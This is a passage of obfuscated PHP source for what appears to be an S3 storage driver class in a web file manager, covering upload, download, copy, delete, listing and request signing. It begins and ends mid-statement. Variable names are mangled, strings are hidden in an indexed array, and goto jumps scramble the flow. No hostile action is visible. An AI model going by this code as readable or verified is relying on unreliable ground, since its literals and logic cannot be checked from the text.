parse_url(trim($this->domain, $EÚŞåÀ°ÜÛ[8])); $eÉŠ’Ÿ©Ñ¹ = isset($A—³íÒªæ[$EÚŞåÀ°ÜÛ[164]]) ? $A—³íÒªæ[$EÚŞåÀ°ÜÛ[164]] : http_type(); $e‘¢ëŸÊ»Ñ = isset($A—³íÒªæ[$EÚŞåÀ°ÜÛ[165]]) ? $A—³íÒªæ[$EÚŞåÀ°ÜÛ[165]] : $A—³íÒªæ[$EÚŞåÀ°ÜÛ[75]]; if (isset($A—³íÒªæ[$EÚŞåÀ°ÜÛ[166]])) { $e‘¢ëŸÊ»Ñ .= $EÚŞåÀ°ÜÛ[4] . $A—³íÒªæ[$EÚŞåÀ°ÜÛ[166]]; } return $eÉŠ’Ÿ©Ñ¹ . $EÚŞåÀ°ÜÛ[167] . $e‘¢ëŸÊ»Ñ; } public function pathEncode($eÁ©­Ïº‰Ï) { $Fğ“¤ÅÔšˆ =& $_SERVER[Ä¿Ş°¨]; return str_replace($Fğ“¤ÅÔšˆ[168], $Fğ“¤ÅÔšˆ[8], rawurlencode($eÁ©­Ïº‰Ï)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($bèŸÆ¯ÊØ„) { set_timeout(); require_once SDK_DIR . $_SERVER[Ä¿Ş°¨][169]; parent::__construct(); $this->_init($bèŸÆ¯ÊØ„); } public function _init($dÁõœ¤ÓŠç) { foreach ($dÁõœ¤ÓŠç as $CƒõßĞ çÃ => $eĞ‹İ¨¹İæ) { if (isset($this->{$CƒõßĞ çÃ})) { $this->{$CƒõßĞ çÃ} = $eĞ‹İ¨¹İæ; } } $this->endpoint = $dÁõœ¤ÓŠç[$_SERVER[Ä¿Ş°¨][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($bİÖ·ª©°¶ = "\x76\64") { $this->signVer = $bİÖ·ª©°¶; $this->client->setSignatureVersion($bİÖ·ª©°¶); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto BïÅ›å¸ˆ; BïÅ›å¸ˆ: $c†åòÍ·ì =& $_SERVER[Ä¿Ş°¨]; $E¡Ëà·ï‰‡ = $this->getBucketCors(); if (!$E¡Ëà·ï‰‡ || !is_array($E¡Ëà·ï‰‡)) { return !1; } goto F•Ã¸ÚÍ¨œ; Eê¢ØÑÂÂÆ: $Dä˜Š‡é = array($c†åòÍ·ì[176], $c†åòÍ·ì[177], $c†åòÍ·ì[178], $c†åòÍ·ì[179], $c†åòÍ·ì[180]); $b¸»¢·ÈÃ = array_diff($Dä˜Š‡é, $CƒÇ¶‰¡ïº); return empty($b¸»¢·ÈÃ); goto eƒäì³ÎÓÌ; F•Ã¸ÚÍ¨œ: if ($E¡Ëà·ï‰‡[$c†åòÍ·ì[171]] != $c†åòÍ·ì[172] || $E¡Ëà·ï‰‡[$c†åòÍ·ì[173]] != $c†åòÍ·ì[172]) { return !1; } $CƒÇ¶‰¡ïº = array_map($c†åòÍ·ì[174], $E¡Ëà·ï‰‡[$c†åòÍ·ì[175]]); if (!is_array($CƒÇ¶‰¡ïº)) { $CƒÇ¶‰¡ïº = array(); } goto Eê¢ØÑÂÂÆ; eƒäì³ÎÓÌ: } public function mkfile($f®‘ÜÛ, $bÛğÁˆÖ¦è = '', $c‹İæ”·ê = REPEAT_RENAME) { $eøä–£ì²Õ = $this->setContent($f®‘ÜÛ, $bÛğÁˆÖ¦è); if ($eøä–£ì²Õ !== !1) { return $this->getPathOuter($f®‘ÜÛ); } return !1; } public function mkdir($bˆ£‰å‹â, $D¿‚ì¢šÈ½ = REPEAT_SKIP) { if (empty($bˆ£‰å‹â)) { return !1; } if ($this->_isFolder($bˆ£‰å‹â)) { return $this->getPathOuter($bˆ£‰å‹â); } $D†é³ÍÃõñ = $this->setContent($bˆ£‰å‹â, $_SERVER[Ä¿Ş°¨][33], !0); if ($D†é³ÍÃõñ !== !1) { return $this->getPathOuter($bˆ£‰å‹â); } return !1; } public function copyFile($F²ªÂÒİ™ø, $F¦·âÄ½ Ä, $DÇÙ‹Ñ§¼ = array()) { $E¥òä‹ÂçÆ =& $_SERVER[Ä¿Ş°¨]; $C´«Æç´Æ® = $this->objectMeta($F²ªÂÒİ™ø); if (!$C´«Æç´Æ®) { return !1; } if ($C´«Æç´Æ®[$E¥òä‹ÂçÆ[77]] <= 1024 * 1024 * 200) { $a‚„øåê¤‹ = $this->client->copyObject($this->bucket, $F²ªÂÒİ™ø, $this->bucket, $F¦·âÄ½ Ä, $E¥òä‹ÂçÆ[181], $DÇÙ‹Ñ§¼); } else { $a‚„øåê¤‹ = $this->client->multiCopyObject($this->bucket, $F²ªÂÒİ™ø, $this->bucket, $F¦·âÄ½ Ä, $DÇÙ‹Ñ§¼); } $a‚„øåê¤‹ = $a‚„øåê¤‹ ? $this->getPathOuter($F¦·âÄ½ Ä) : !1; return $a‚„øåê¤‹; } public function moveFile($FÂÒ¸°±ôÃ, $AòïĞØÔ‰Ù) { if ($this->copyFile($FÂÒ¸°±ôÃ, $AòïĞØÔ‰Ù)) { $this->delFile($FÂÒ¸°±ôÃ); return $this->getPathOuter($AòïĞØÔ‰Ù); } return !1; } public function delFile($B¼¨¡¨ÕšÈ) { return $this->client->deleteObject($this->bucket, $B¼¨¡¨ÕšÈ); } public function delFolder($Aƒ£é†ˆÆ) { goto b²çŒµ°•˜; Dö…‰”ë: $BÁºÒ™˜íÆ = $FƒíˆŒ„÷¡ = 0; $dğËùÃğƒß = array_chunk(array_keys($B×æ¼ë—Ë), 1000); foreach ($dğËùÃğƒß as $C­¦Ê…áƒ¶) { $BÁºÒ™˜íÆ++; $FƒíˆŒ„÷¡ += (int) $this->client->deleteObjects($this->bucket, $C­¦Ê…áƒ¶); } goto DîÔÂˆ”ó; DîÔÂˆ”ó: return $BÁºÒ™˜íÆ === $FƒíˆŒ„÷¡ ? !0 : !1; goto d¸ˆ‚ˆù©; b²çŒµ°•˜: $f’‰ÎœŒ¼– =& $_SERVER[Ä¿Ş°¨]; $B×æ¼ë—Ë = $this->listObjs($Aƒ£é†ˆÆ); if (!$B×æ¼ë—Ë) { $Aƒ£é†ˆÆ = trim($Aƒ£é†ˆÆ, $f’‰ÎœŒ¼–[8]); if (!empty($Aƒ£é†ˆÆ)) { $Aƒ£é†ˆÆ .= $f’‰ÎœŒ¼–[8]; } return $this->delFile($Aƒ£é†ˆÆ); } goto Dö…‰”ë; d¸ˆ‚ˆù©: } public function rename($fÔá¸¡Å”¾, $eÂ´ñ²îó¾) { return $this->renameObject($fÔá¸¡Å”¾, $eÂ´ñ²îó¾); } public function listPath($Dƒ§Ğ¢ì©˜, $B«ÍŠÔªá½ = false) { $E®´æÄÃ«Ü =& $_SERVER[Ä¿Ş°¨]; $D´¸¸‰Ğ¤ = $this->listObjs($Dƒ§Ğ¢ì©˜, null, null, $E®´æÄÃ«Ü[8]); $bØÕøè”®” = array($E®´æÄÃ«Ü[74] => array(), $E®´æÄÃ«Ü[73] => array()); foreach ($D´¸¸‰Ğ¤ as $C«´ğ …å => $d‚Ïƒ¶‹ˆª) { if ($C«´ğ …å == $E®´æÄÃ«Ü[8]) { continue; } if (isset($d‚Ïƒ¶‹ˆª[$E®´æÄÃ«Ü[182]])) { $bØÕøè”®”[$E®´æÄÃ«Ü[74]][] = $this->folderInfo($d‚Ïƒ¶‹ˆª[$E®´æÄÃ«Ü[182]], $B«ÍŠÔªá½); } else { if (substr($d‚Ïƒ¶‹ˆª[$E®´æÄÃ«Ü[28]], -1) == $E®´æÄÃ«Ü[8]) { continue; } $bØÕøè”®”[$E®´æÄÃ«Ü[73]][] = $this->fileInfo($d‚Ïƒ¶‹ˆª[$E®´æÄÃ«Ü[28]], $B«ÍŠÔªá½, $d‚Ïƒ¶‹ˆª); } } return $bØÕøè”®”; } private function fileInfo($D‚¤İÒå÷, $f´Ëì È¡ = false, $C“‰·ßƒ“¦ = array()) { goto bœˆßĞß»; fóØ¨öã¯: if (empty($C“‰·ßƒ“¦)) { $C“‰·ßƒ“¦ = $this->objectMeta($D‚¤İÒå÷); if (!$C“‰·ßƒ“¦) { return $Bİ»…Ö×¿–; } } if (isset($C“‰·ßƒ“¦[$fàÖó‰„´[186]])) { $Bİ»…Ö×¿–[$fàÖó‰„´[106]] = $C“‰·ßƒ“¦[$fàÖó‰„´[186]]; } if (isset($C“‰·ßƒ“¦[$fàÖó‰„´[77]])) { $Bİ»…Ö×¿–[$fàÖó‰„´[77]] = $C“‰·ßƒ“¦[$fàÖó‰„´[77]]; } goto f ¾¡“£¾é; f ¾¡“£¾é: return $Bİ»…Ö×¿–; goto aÚÃ×ãäğ­; bœˆßĞß»: $fàÖó‰„´ =& $_SERVER[Ä¿Ş°¨]; if ($f´Ëì È¡) { return array($fàÖó‰„´[28] => $this->pathThis($D‚¤İÒå÷), $fàÖó‰„´[75] => $this->getPathOuter($D‚¤İÒå÷), $fàÖó‰„´[29] => $fàÖó‰„´[163], $fàÖó‰„´[156] => $this->ext($D‚¤İÒå÷), $fàÖó‰„´[77] => isset($C“‰·ßƒ“¦[$fàÖó‰„´[77]]) ? $C“‰·ßƒ“¦[$fàÖó‰„´[77]] : 0, $fàÖó‰„´[183] => 0, $fàÖó‰„´[106] => 0, $fàÖó‰„´[184] => !0, $fàÖó‰„´[185] => !0); } $Bİ»…Ö×¿– = array($fàÖó‰„´[28] => $this->pathThis($D‚¤İÒå÷), $fàÖó‰„´[75] => $this->getPathOuter($D‚¤İÒå÷), $fàÖó‰„´[29] => $fàÖó‰„´[163], $fàÖó‰„´[183] => 0, $fàÖó‰„´[106] => 0, $fàÖó‰„´[77] => 0, $fàÖó‰„´[156] => $this->ext($D‚¤İÒå÷), $fàÖó‰„´[184] => !0, $fàÖó‰„´[185] => !0); goto fóØ¨öã¯; aÚÃ×ãäğ­: } private function folderInfo($d­Î¯ø°…–, $FŠæ‘à ñ = false) { goto Dãï¾ãÁ¡; e£˜Ë’“ÍÅ: if ($d­Î¯ø°…– == $dÏ¾Æ»à—ª[33]) { return $cˆŠßÒñ‹Á; } $d­Î¯ø°…– = trim($d­Î¯ø°…–, $dÏ¾Æ»à—ª[8]) . $dÏ¾Æ»à—ª[8]; $fÔñØŸ”Å = $this->objectMeta($d­Î¯ø°…–); goto a’÷‹Ô‹¯¼; a’÷‹Ô‹¯¼: if (isset($fÔñØŸ”Å[$dÏ¾Æ»à—ª[186]])) { $cˆŠßÒñ‹Á[$dÏ¾Æ»à—ª[183]] = $fÔñØŸ”Å[$dÏ¾Æ»à—ª[186]]; } return $cˆŠßÒñ‹Á; goto Eù’²ò‘‹; Dãï¾ãÁ¡: $dÏ¾Æ»à—ª =& $_SERVER[Ä¿Ş°¨]; if ($FŠæ‘à ñ) { return array($dÏ¾Æ»à—ª[28] => $this->pathThis($d­Î¯ø°…–), $dÏ¾Æ»à—ª[75] => $this->getPathOuter($dÏ¾Æ»à—ª[8] . $d­Î¯ø°…–), $dÏ¾Æ»à—ª[29] => $dÏ¾Æ»à—ª[76], $dÏ¾Æ»à—ª[184] => !0, $dÏ¾Æ»à—ª[185] => !0); } $cˆŠßÒñ‹Á = array($dÏ¾Æ»à—ª[28] => $this->pathThis($d­Î¯ø°…–), $dÏ¾Æ»à—ª[75] => $this->getPathOuter($dÏ¾Æ»à—ª[8] . $d­Î¯ø°…–), $dÏ¾Æ»à—ª[29] => $dÏ¾Æ»à—ª[76], $dÏ¾Æ»à—ª[183] => 0, $dÏ¾Æ»à—ª[106] => 0, $dÏ¾Æ»à—ª[184] => !0, $dÏ¾Æ»à—ª[185] => !0); goto e£˜Ë’“ÍÅ; Eù’²ò‘‹: } public function listObjs($CÁœÙ†øÙ, $díè»ïâ = null, $F·ã­ñ ± = null, $D§î°­Ü´Ü = null) { $F‚µ­•’¿Â =& $_SERVER[Ä¿Ş°¨]; $CÁœÙ†øÙ = trim($CÁœÙ†øÙ, $F‚µ­•’¿Â[8]); $A¦ô«£ĞĞ™ = empty($CÁœÙ†øÙ) ? $F‚µ­•’¿Â[33] : $CÁœÙ†øÙ . $F‚µ­•’¿Â[8]; return $this->client->getBucket($this->bucket, $A¦ô«£ĞĞ™, $díè»ïâ, $F·ã­ñ ±, $D§î°­Ü´Ü, !0); } public function has($a‘ÅÄµÆ–°, $AÆ˜¸Ş” = false, $díÑï…÷– = true) { goto Cêöëå³–ï; Cêöëå³–ï: $Cê…Ï³êå© =& $_SERVER[Ä¿Ş°¨]; $Aíò¼®Š = 0; $C¼ŞËäğ„ƒ = 0; goto A„À¢˜â¹; A„À¢˜â¹: $d÷°†’©ØÊ = $this->listObjs($a‘ÅÄµÆ–°, null, null, $Cê…Ï³êå©[8]); $d÷°†’©ØÊ = is_array($d÷°†’©ØÊ) ? $d÷°†’©ØÊ : array(); foreach ($d÷°†’©ØÊ as $E¤ÔŠ…ğ) { if (isset($E¤ÔŠ…ğ[$Cê…Ï³êå©[28]]) && substr($E¤ÔŠ…ğ[$Cê…Ï³êå©[28]], -1) != $Cê…Ï³êå©[8]) { if (!$AÆ˜¸Ş” && $díÑï…÷–) { return !0; } $Aíò¼®Š++; } else { if (isset($E¤ÔŠ…ğ[$Cê…Ï³êå©[182]])) { if (!$AÆ˜¸Ş” && !$díÑï…÷–) { return !1; } $C¼ŞËäğ„ƒ++; } } } goto d—Šíç¡ÁË; d—Šíç¡ÁË: if ($AÆ˜¸Ş”) { return array($Cê…Ï³êå©[187] => $Aíò¼®Š, $Cê…Ï³êå©[188] => $C¼ŞËäğ„ƒ); } return !1; goto Bš”¹”‹“’; Bš”¹”‹“’: } public function listAll($c©ÃÑ˜Ì‘Ü) { $EÜ¢Ú±Ü¸— =& $_SERVER[Ä¿Ş°¨]; $f¹ƒ‰Ñà•¶ = $this->listObjs($c©ÃÑ˜Ì‘Ü); $B‹ö†®á— = $eŒµÆÍöºÈ = array(); foreach ($f¹ƒ‰Ñà•¶ as $B–ØåèÚ×Œ => $dîì£§¡ç) { $B‹ö†®á—[] = $dîì£§¡ç[$EÜ¢Ú±Ü¸—[28]]; $eŒµÆÍöºÈ[$B–ØåèÚ×Œ] = $dîì£§¡ç[$EÜ¢Ú±Ü¸—[77]]; } return $this->listAllFiles($c©ÃÑ˜Ì‘Ü, $B‹ö†®á—, $eŒµÆÍöºÈ); } public function canRead($A›Ã»¬ï¢Š) { $D‚â“ñ«‰ =& $_SERVER[Ä¿Ş°¨]; $Eª”Š»½×ø = $this->client->getAccessControlPolicy($this->bucket, $A›Ã»¬ï¢Š); if (!$Eª”Š»½×ø) { return !1; } return in_array($Eª”Š»½×ø, array($D‚â“ñ«‰[189], $D‚â“ñ«‰[190], $D‚â“ñ«‰[191])) ? !0 : !1; } public function canWrite($dè»ƒ”¢µÛ) { $AìëªŠŞñª =& $_SERVER[Ä¿Ş°¨]; $f…Şç„÷èø = $this->client->getAccessControlPolicy($this->bucket, $dè»ƒ”¢µÛ); if (!$f…Şç„÷èø) { return !1; } return in_array($f…Şç„÷èø, array($AìëªŠŞñª[189], $AìëªŠŞñª[190])) ? !0 : !1; } public function getContent($EÚñˆŠéÂ) { return $this->client->getObject($this->bucket, $EÚñˆŠéÂ); } public function setContent($fĞ‡ËÛÕùÎ, $FÏÃæå«èÄ = '', $E´¶ÙÆÄ× = false) { goto fÊŞ­œ„ˆ‡; fÊŞ­œ„ˆ‡: $D°í¬‡‘ôË =& $_SERVER[Ä¿Ş°¨]; $fĞ‡ËÛÕùÎ = $E´¶ÙÆÄ× ? trim($fĞ‡ËÛÕùÎ, $D°í¬‡‘ôË[8]) . $D°í¬‡‘ôË[8] : $fĞ‡ËÛÕùÎ; $aÈ§ãÜ¸† = get_file_mime(get_path_ext($fĞ‡ËÛÕùÎ)); goto aŒî’²«Æ; aŒî’²«Æ: $FÖŒñ­ì³† = $this->client->putObject($FÏÃæå«èÄ, $this->bucket, $fĞ‡ËÛÕùÎ, $D°í¬‡‘ôË[181], array(), $aÈ§ãÜ¸†); if (!$FÖŒñ­ì³†) { return !1; } if ($E´¶ÙÆÄ×) { return !0; } goto AŠíÊï×‘‹; AŠíÊï×‘‹: $FÖŒñ­ì³† = $this->copyFile($fĞ‡ËÛÕùÎ, $fĞ‡ËÛÕùÎ, array($D°í¬‡‘ôË[192] => $FÖŒñ­ì³†[$D°í¬‡‘ôË[193]])); return $FÖŒñ­ì³† ? !0 : !1; goto fä—¨ˆ; fä—¨ˆ: } public function fileSubstr($CáãË˜°ä¬, $BÍäÊìÜ¥ˆ, $B–ì¶Ìù”) { $bòóå¾¡í¾ = $BÍäÊìÜ¥ˆ + $B–ì¶Ìù” - 1; return $this->client->getObject($this->bucket, $CáãË˜°ä¬, array($_SERVER[Ä¿Ş°¨][194] => "\x62\x79\x74\145\163\x3d{$BÍäÊìÜ¥ˆ}\55{$bòóå¾¡í¾}")); } public function upload($cÂ«Œ¸Ìá, $f¸õ¹«Åê, $B’©ù¹ÎÚÅ = false, $dŸö´¸ºğ“ = REPEAT_REPLACE) { $BÇ–³ÂÙá± =& $_SERVER[Ä¿Ş°¨]; $E‹£ ¯à¥‘ = array($BÇ–³ÂÙá±[192] => @md5_file($f¸õ¹«Åê)); $cµì£Â÷½ = array($BÇ–³ÂÙá±[195] => get_file_mime(get_path_ext($cÂ«Œ¸Ìá))); if (IO::size($f¸õ¹«Åê) <= 1024 * 1024 * 200) { $DÄ‹éÒ‘­ = $this->client->putObjectFile($f¸õ¹«Åê, $this->bucket, $cÂ«Œ¸Ìá, $BÇ–³ÂÙá±[181], $E‹£ ¯à¥‘, $cµì£Â÷½); return !empty($DÄ‹éÒ‘­) ? $this->getPathOuter($cÂ«Œ¸Ìá) : !1; } $D×¼ö˜¡¬ = $this->client->multiUploadObject($f¸õ¹«Åê, $this->bucket, trim($cÂ«Œ¸Ìá, $BÇ–³ÂÙá±[8]), $E‹£ ¯à¥‘, $cµì£Â÷½); return $D×¼ö˜¡¬ ? $this->getPathOuter($cÂ«Œ¸Ìá) : !1; } public function download($D‚æ¥ÖË“, $DµºŞÃÇŠ) { if (!@is_dir($this->pathFather($DµºŞÃÇŠ)) && !IO::mkdir($this->pathFather($DµºŞÃÇŠ))) { return !1; } $c°©•ƒòïÏ = $this->client->getObject($this->bucket, $D‚æ¥ÖË“, array(), $DµºŞÃÇŠ); return $c°©•ƒòïÏ !== !1 ? $DµºŞÃÇŠ : !1; } public function link($dîÄ÷Šç« , $F–İ»†âÓ = array()) { $AòŒ°ÕİÈ¬ =& $_SERVER[Ä¿Ş°¨]; if ($this->signVer == $AòŒ°ÕİÈ¬[196]) { return $this->client->getAuthenticatedURL($this->bucket, $dîÄ÷Šç« , 3600 * 12, $F–İ»†âÓ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($dîÄ÷Šç« , $AòŒ°ÕİÈ¬[8]), 3600 * 12, $this->region, array(), !0, $F–İ»†âÓ); } public function fileOut($eÂƒîŒõÂ—, $AğáŒ¯»¾• = false, $cÓÃõ™ˆ÷ = false, $Dƒ™Ç‚Ğë = '') { goto cã¥ƒ…±«; eÆ…Üõ½œ: $C¹Ï¶â†º§ = $this->link($eÂƒîŒõÂ—, $C§Ãõ¿Ã‹); $this->fileOutLink($C¹Ï¶â†º§); goto fá‡ó•…äù; D•¢¢‘‡Òì: if ($EÚø™Ãßøæ == $c†£ó…×ÀÜ[197]) { return parent::fileOut($eÂƒîŒõÂ—, $AğáŒ¯»¾•, $cÓÃõ™ˆ÷, $Dƒ™Ç‚Ğë); } $AğáŒ¯»¾• = $AğáŒ¯»¾• ? $c†£ó…×ÀÜ[198] : $c†£ó…×ÀÜ[199]; $C§Ãõ¿Ã‹ = array($c†£ó…×ÀÜ[200] => $AğáŒ¯»¾• . $c†£ó…×ÀÜ[201] . rawurlencode($cÓÃõ™ˆ÷), $c†£ó…×ÀÜ[202] => $EÚø™Ãßøæ); goto eÆ…Üõ½œ; cã¥ƒ…±«: $c†£ó…×ÀÜ =& $_SERVER[Ä¿Ş°¨]; if (!$cÓÃõ™ˆ÷) { $cÓÃõ™ˆ÷ = $this->pathThis($eÂƒîŒõÂ—); } $EÚø™Ãßøæ = get_file_mime(get_path_ext($cÓÃõ™ˆ÷)); goto D•¢¢‘‡Òì; fá‡ó•…äù: } public function fileOutServer($aò»¾›Ç›¥, $f¦´å¶í‡ = false, $D¿·§ì ¸ = false, $e”¼˜ƒÉ = '') { parent::fileOut($aò»¾›Ç›¥, $f¦´å¶í‡, $D¿·§ì ¸, $e”¼˜ƒÉ); } public function fileOutImage($e«ÌÆÅÍÈŞ, $FííĞËÓ¾­ = 250) { $dŒÑÈ»ğ¢ = $this->link($e«ÌÆÅÍÈŞ); $this->fileOutLink($dŒÑÈ»ğ¢); } public function fileOutImageServer($E†Şâ¸“Í, $e„ÁöƒÜ = 250) { parent::fileOutImage($E†Şâ¸“Í, $e„ÁöƒÜ); } public function hashMd5($c‡ÀĞÔÜŒ, $e´Ö—¬¢‚» = '') { $dÚ‹‡Ì±¥á =& $_SERVER[Ä¿Ş°¨]; $e“´°†ÌÎÙ = $this->objectMeta($c‡ÀĞÔÜŒ); if (!$e“´°†ÌÎÙ) { return !1; } $e´Ö—¬¢‚» = $e´Ö—¬¢‚» ? $e´Ö—¬¢‚» : _get($e“´°†ÌÎÙ, $dÚ‹‡Ì±¥á[203]); $e´Ö—¬¢‚» = $e´Ö—¬¢‚» ? $e´Ö—¬¢‚» : _get($e“´°†ÌÎÙ, $dÚ‹‡Ì±¥á[193], $dÚ‹‡Ì±¥á[33]); return $e´Ö—¬¢‚»; } public function uploadFormData($BŒ›ôÛñÚ‰, $CËŸ™ˆç¬¾ = 3600) { $A„‡Â¦­ê =& $_SERVER[Ä¿Ş°¨]; $C£ÇĞ—§å = $this->pathFather($BŒ›ôÛñÚ‰); $eªÑÚ ®™ = $this->client->getHttpUploadPostParams($this->bucket, $C£ÇĞ—§å, $A„‡Â¦­ê[181], $CËŸ™ˆç¬¾); return array_merge((array) $eªÑÚ ®™, array($A„‡Â¦­ê[165] => $this->getHost())); } public function multiUploadFormData($DëË¨£áÎæ, $aµŒË¼Š«¶ = 3600) { $E‰µóšğïà =& $_SERVER[Ä¿Ş°¨]; $c¦›°ÌË¡ƒ = gmdate($E‰µóšğïà[204]); $d›è©¨Éá = array(); $FÆ¿Í‰³¥Ï = $this->client->getUploadId($this->bucket, $DëË¨£áÎæ, $d›è©¨Éá); if (!$FÆ¿Í‰³¥Ï) { return !1; } return array($E‰µóšğïà[205] => $FÆ¿Í‰³¥Ï, $E‰µóšğïà[165] => $this->getHost() . $E‰µóšğïà[8] . $this->pathEncode($DëË¨£áÎæ), $E‰µóšğïà[206] => $c¦›°ÌË¡ƒ, $E‰µóšğïà[89] => $DëË¨£áÎæ); } public function multiUploadAuthData($E‘Æ¢›³âæ, $e»Ã†”Óß = array()) { goto f“ƒáƒƒŸª; f‰¿Ñã§²„: $EŠÔ×íÁé· = $e»Ã†”Óß[$c˜ãò ß„[89]]; unset($e»Ã†”Óß[$c˜ãò ß„[89]]); if (isset($e»Ã†”Óß[$c˜ãò ß„[207]])) { $e»Ã†”Óß[$c˜ãò ß„[206]] = $b¶éÆ¡ºÔö; return $this->listUploadParts($EŠÔ×íÁé·, $e»Ã†”Óß); } goto fƒö²ò»„¶; eŠì¸ÙòØ¢: $A‹Ø›å¸ã½ = implode($c˜ãò ß„[213], $EÒÏ»ÂÒ»); $Aåî÷†ƒËä = base64_encode(hash_hmac($c˜ãò ß„[214], $A‹Ø›å¸ã½, $this->secret, !0)); $eîÇˆš‡Á = $c˜ãò ß„[215] . $this->accessKey . $c˜ãò ß„[4] . $Aåî÷†ƒËä; goto aË“ƒÀ‰‹; aË“ƒÀ‰‹: if (strpos($díŞÒäñ³, $c˜ãò ß„[209]) === 0) { return array($c˜ãò ß„[216] => $eîÇˆš‡Á, $c˜ãò ß„[206] => $b¶éÆ¡ºÔö); } return $eîÇˆš‡Á; goto EîØãÎÉ­…; f“ƒáƒƒŸª: $c˜ãò ß„ =& $_SERVER[Ä¿Ş°¨]; $b¶éÆ¡ºÔö = isset($e»Ã†”Óß[$c˜ãò ß„[206]]) ? $e»Ã†”Óß[$c˜ãò ß„[206]] : gmdate($c˜ãò ß„[204]); $díŞÒäñ³ = isset($e»Ã†”Óß[$c˜ãò ß„[156]]) ? $e»Ã†”Óß[$c˜ãò ß„[156]] : $c˜ãò ß„[33]; goto f‰¿Ñã§²„; fƒö²ò»„¶: $EÒÏ»ÂÒ» = array($c˜ãò ß„[208], $c˜ãò ß„[33], $c˜ãò ß„[115], $c˜ãò ß„[33], "\170\55\x61\x6d\x7a\55\x64\x61\x74\x65\x3a{$b¶éÆ¡ºÔö}", $c˜ãò ß„[8] . $this->bucket . $c˜ãò ß„[8] . $this->pathEncode($EŠÔ×íÁé·) . $díŞÒäñ³); if (strpos($díŞÒäñ³, $c˜ãò ß„[209]) === 0) { $EÒÏ»ÂÒ»[0] = $c˜ãò ß„[210]; } if (isset($e»Ã†”Óß[$c˜ãò ß„[211]]) && $e»Ã†”Óß[$c˜ãò ß„[211]] == $c˜ãò ß„[212]) { $EÒÏ»ÂÒ»[0] = $c˜ãò ß„[212]; } goto eŠì¸ÙòØ¢; EîØãÎÉ­…: } public function listUploadParts($CãöƒèŒÛò, $c†êƒÈÃª = array()) { goto B¿Å®Š–ëÇ; CÕÌğ§¯¿†: if (!$DĞµ˜Ú§‡) { return !1; } unset($c†êƒÈÃª[$A¸¿ö‡º‚[207]], $c†êƒÈÃª[$A¸¿ö‡º‚[211]]); $c†êƒÈÃª[$A¸¿ö‡º‚[89]] = $CãöƒèŒÛò; goto fŠˆ¯‚œ¬ª; fŠˆ¯‚œ¬ª: $bÃ±ÚîâÁ½ = $this->multiUploadAuthData($CãöƒèŒÛò, $c†êƒÈÃª); if (empty($bÃ±ÚîâÁ½)) { return !1; } return array($A¸¿ö‡º‚[216] => $bÃ±ÚîâÁ½, $A¸¿ö‡º‚[206] => $c†êƒÈÃª[$A¸¿ö‡º‚[206]], $A¸¿ö‡º‚[218] => $DĞµ˜Ú§‡); goto E«éö¾«´ó; B¿Å®Š–ëÇ: $A¸¿ö‡º‚ =& $_SERVER[Ä¿Ş°¨]; $eÅğ¢»ˆÍŒ = str_replace($A¸¿ö‡º‚[217], $A¸¿ö‡º‚[33], $c†êƒÈÃª[$A¸¿ö‡º‚[156]]); $DĞµ˜Ú§‡ = $this->client->listParts($this->bucket, $CãöƒèŒÛò, $eÅğ¢»ˆÍŒ); goto CÕÌğ§¯¿†; E«éö¾«´ó: } public function getHost() { return parent::getHost() . $_SERVER[Ä¿Ş°¨][8] . $this->bucket; } public function size($A¤îÍĞ‚¿) { $f°¶¬ÃŸè¥ = $this->objectMeta($A¤îÍĞ‚¿); return $f°¶¬ÃŸè¥ ? $f°¶¬ÃŸè¥[$_SERVER[Ä¿Ş°¨][77]] : 0; } public function info($FÙŞ«» çê) { if ($this->isFolder($FÙŞ«» çê)) { return $this->folderInfo($FÙŞ«» çê); } else { if ($this->isFile($FÙŞ«» çê)) { return $this->fileInfo($FÙŞ«» çê); } } return !1; } public function exist($c†Äœ…õÂ×) { return $this->isFile($c†Äœ…õÂ×) || $this->isFolder($c†Äœ…õÂ×); } public function isFile($E¼Çã‘šõ) { return !$this->isFolder($E¼Çã‘šõ) && $this->objectMeta($E¼Çã‘šõ); } public function isFolder($bŒÚ˜˜ƒ) { return $this->cacheMethod($_SERVER[Ä¿Ş°¨][219], $bŒÚ˜˜ƒ); } protected function objectMeta($aìÚŠçáŸÜ) { return $this->cacheMethod($_SERVER[Ä¿Ş°¨][220], $aìÚŠçáŸÜ); } protected function _objectMeta($e«œÎÀÒÑ˜) { $Fºõˆ†éŒ =& $_SERVER[Ä¿Ş°¨]; $e«œÎÀÒÑ˜ = rtrim($e«œÎÀÒÑ˜, $Fºõˆ†éŒ[8]); try { $CÌ”†øİ±Á = $this->client->getObjectInfo($this->bucket, $e«œÎÀÒÑ˜); if (!isset($CÌ”†øİ±Á[$Fºõˆ†éŒ[203]]) && isset($CÌ”†øİ±Á[$Fºõˆ†éŒ[221]])) { $CÌ”†øİ±Á[$Fºõˆ†éŒ[203]] = $CÌ”†øİ±Á[$Fºõˆ†éŒ[221]]; } } catch (OSS\Core\OssException $Aù‚¿ÄÊ¢±) { $CÌ”†øİ±Á = !1; } if (!$CÌ”†øİ±Á) { } return $CÌ”†øİ±Á; } protected function _isFolder($B‚Ğ¹’Š»ô) { goto Fë²¯ºŠ›î; A²­Ú²¾ùì: if (substr($BÊ¦ƒÈÃ¥—[0][$b°¤ëÌ›ñ[28]], -1) == $b°¤ëÌ›ñ[8]) { return !0; } if (get_path_this($BÊ¦ƒÈÃ¥—[0][$b°¤ëÌ›ñ[28]]) == get_path_this($B‚Ğ¹’Š»ô)) { return !1; } return !0; goto cë”Éé¶°; E¬÷¿œƒ’Æ: $BÊ¦ƒÈÃ¥— = $this->client->getBucket($this->bucket, $B‚Ğ¹’Š»ô, null, 1); if (empty($BÊ¦ƒÈÃ¥—)) { return !1; } $BÊ¦ƒÈÃ¥— = array_values($BÊ¦ƒÈÃ¥—); goto A²­Ú²¾ùì; Fë²¯ºŠ›î: $b°¤ëÌ›ñ =& $_SERVER[Ä¿Ş°¨]; $B‚Ğ¹’Š»ô = rtrim($B‚Ğ¹’Š»ô, 